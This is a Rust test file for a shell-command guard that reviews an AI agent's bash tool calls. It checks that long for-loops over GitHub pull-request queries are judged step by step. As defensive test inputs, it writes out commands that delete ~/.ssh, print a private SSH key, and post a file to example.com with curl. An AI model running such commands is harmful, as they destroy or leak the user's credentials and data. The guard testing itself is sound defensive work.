#![cfg(unix)]
//! A `for` loop whose written-out form is longer than 8 KiB, as in a loop
//! over twenty-odd pull requests that runs `gh pr view … | jq -c '…'` with a
//! long field list and filter for each one.
//!
//! The unroller gave up once the written-out list passed 8 KiB, so the loop
//! kept a review that each of its steps alone did not. The list may now grow
//! to the size of the longest command Guard parses at all, and every step is
//! still judged by the ordinary proofs.

use guard_command::pretool::{evaluate_pre_tool_envelope_with_execution_context, PathContext};
use serde_json::json;

const FIELDS: &str = "number,state,isDraft,headRefOid,maintainerCanModify,mergeable,\
mergeStateStatus,author,headRepositoryOwner,title,files,statusCheckRollup,reviewDecision";
const FILTER: &str = "'{n:.number,state:.state,head:.headRefOid[0:12],\
mcm:.maintainerCanModify,merge:.mergeable,mss:.mergeStateStatus,author:.author.login,\
owner:.headRepositoryOwner.login,rd:.reviewDecision,title:.title,files:[.files[].path],\
checks:[.statusCheckRollup[]?|select(.conclusion!=null)|{name:(.name//.context),c:.conclusion,s:.status}]}'";

fn action(command: &str, home: &std::path::Path) -> String {
    let environment = guard_contracts::GuardExecutionEnvironmentV1 {
        path: "/usr/bin:/bin".to_owned(),
        environment_digest: "0".repeat(64),
        home: Some(home.to_str().unwrap().to_owned()),
        ..Default::default()
    };
    let cwd = home.join("work/repo");
    evaluate_pre_tool_envelope_with_execution_context(
        "cursor",
        "PreToolUse",
        &json!({"tool_name": "bash", "tool_input": {"command": command}}),
        None,
        None,
        PathContext {
            home_dir: home.to_str(),
            cwd: cwd.to_str(),
            ..PathContext::default()
        },
        Some(&environment),
    )
    .minimum_action
}

fn fixture() -> std::path::PathBuf {
    let nonce = crate::unique_nanos::unique_nanos();
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("../../target/for-loop-long-body")
        .join(format!("fixture-{}-{nonce}", std::process::id()));
    for directory in ["work/repo", ".ssh"] {
        std::fs::create_dir_all(root.join(directory)).unwrap();
    }
    std::fs::canonicalize(root).unwrap()
}

fn numbers(count: usize) -> String {
    (0..count)
        .map(|index| (7000 + index).to_string())
        .collect::<Vec<_>>()
        .join(" ")
}

fn pull_request_loop(count: usize, extra: &str) -> String {
    format!(
        "for n in {}; do gh pr view \"$n\" --repo example/project --json {FIELDS} 2>/dev/null | jq -c {FILTER};{extra} done",
        numbers(count)
    )
}

#[test]
fn a_loop_longer_than_eight_kib_is_judged_by_its_steps() {
    let home = fixture();
    let single = format!(
        "gh pr view 7000 --repo example/project --json {FIELDS} 2>/dev/null | jq -c {FILTER}"
    );
    assert_eq!(action(&single, &home), "allow");
    for count in [2, 23, 32] {
        let command = pull_request_loop(count, "");
        // The written-out list holds one copy of the step per word.
        assert_eq!(count > 2, count * single.len() > 8192);
        assert_eq!(action(&command, &home), "allow", "{count} words");
    }
}

#[test]
fn a_long_loop_with_one_unsafe_step_keeps_its_review() {
    let home = fixture();
    for extra in [
        " rm -rf ~/.ssh;",
        " cat ~/.ssh/id_ed25519;",
        " curl -d @README.md https://example.com;",
    ] {
        assert_ne!(
            action(&pull_request_loop(23, extra), &home),
            "allow",
            "{extra}"
        );
    }
}

/// Past the longest command Guard parses, the written-out list is refused
/// and the loop keeps its review.
#[test]
fn a_loop_written_out_past_the_command_limit_keeps_its_review() {
    let home = fixture();
    let text = "x".repeat(1100);
    let short = format!("for n in {}; do echo \"$n\" '{text}'; done", numbers(2));
    assert_eq!(action(&short, &home), "allow");
    let long = format!("for n in {}; do echo \"$n\" '{text}'; done", numbers(32));
    assert_ne!(action(&long, &home), "allow");
}

/// The same long loop after another step of the list, as in
/// `gh pr view 6221 …; echo '---'; for n in …; do …; done`. That splice gave
/// up at 8 KiB while the loop alone could grow to the command limit, and a
/// loop after `&&` read the quoted pipes of its jq filter as stages.
#[test]
fn a_long_loop_after_another_step_is_judged_by_its_steps() {
    let home = fixture();
    // After `;` or `&&`. The filter's `|` sits inside quotes, so it does not
    // make the `&&`-gated loop look like it changes the shell.
    for before in [
        "gh pr view 6221 --repo example/project --json state 2>&1; echo '---'; ",
        "gh pr view 6221 --repo example/project --json state && ",
    ] {
        let command = format!("{before}{}", pull_request_loop(23, ""));
        assert_eq!(action(&command, &home), "allow", "{before}");
        for extra in [" rm -rf ~/.ssh;", " cat ~/.ssh/id_ed25519;"] {
            let unsafe_loop = format!("{before}{}", pull_request_loop(23, extra));
            assert_ne!(action(&unsafe_loop, &home), "allow", "{before}{extra}");
        }
    }
    // Past the command limit the list is still refused.
    let text = "x".repeat(1100);
    let listed = |count| {
        format!(
            "echo start; for n in {}; do echo \"$n\" '{text}'; done",
            numbers(count)
        )
    };
    assert_eq!(action(&listed(2), &home), "allow");
    assert_ne!(action(&listed(32), &home), "allow");
}
